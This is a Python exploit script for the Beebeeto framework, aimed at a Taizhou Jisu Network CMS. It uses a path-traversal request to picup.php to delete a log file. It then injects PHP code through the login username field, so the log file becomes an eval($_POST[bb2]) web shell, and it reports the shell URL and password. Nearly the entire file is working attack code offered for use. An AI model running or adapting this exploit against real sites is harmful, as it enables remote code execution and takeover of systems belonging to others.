#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0054',
            'name': '台州市极速网络CMS /data/log/passlog.php 任意代码执行漏洞 POC & Exploit',
            'author': '1024',
            'create_date': '2015-03-08',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': '台州市极速网络CMS',
            'vul_version': ['*'],
            'type': 'Command Execution',
            'tag': ['台州市极速网络CMS漏洞', '任意代码执行漏洞', '/data/log/passlog.php', 'php'],
            'desc': '厂商：http://www.90576.com/  台州市极速网络有限公司',
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-085633',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        url = args['options']['target']
        # del passlog
        del_url = '%s/picup.php?action=del&pic=../data/log/passlog.php' % url
        requests.get(del_url)
        if args['options']['verbose']:
            print '[*] Request DEL_URL: ' + del_url
        # submit code
        login_url = '%s/login.php?action=login&lonadmin=1' % url
        login_data = {'loginuser': '<?php echo(md5(0));phpinfo();?>','loginpass':'0'}
        if args['options']['verbose']:
            print '[*] Submit code: ' + login_url
            print '[*] Code content: ' + login_data['loginuser']
        requests.post(login_url, data=login_data)
        # return page
        verify_url = '%s/data/log/passlog.php' % url
        content = requests.get(verify_url).content
        if 'cfcd208495d565ef66e7dff9f98764da' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args


    @classmethod
    def exploit(cls, args):
        url = args['options']['target']
        # del passlog
        del_url = '%s/picup.php?action=del&pic=../data/log/passlog.php' % url
        requests.get(del_url)
        if args['options']['verbose']:
            print '[*] Request DEL_URL: ' + del_url
        # submit code
        login_url = '%s/login.php?action=login&lonadmin=1' % url
        login_data = {'loginuser': '<?php echo(md5(0));eval($_POST[bb2]);?>','loginpass':'0'}
        if args['options']['verbose']:
            print '[*] Submit code: ' + login_url
            print '[*] Code content: ' + login_data['loginuser']
        requests.post(login_url, data=login_data)
        # return page
        webshell = '%s/data/log/passlog.php' % url
        content = requests.get(webshell).content
        if 'cfcd208495d565ef66e7dff9f98764da' in content:
            args['success'] = True
            args['poc_ret']['webshell'] = webshell
            args['poc_ret']['password'] = 'bb2'
        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())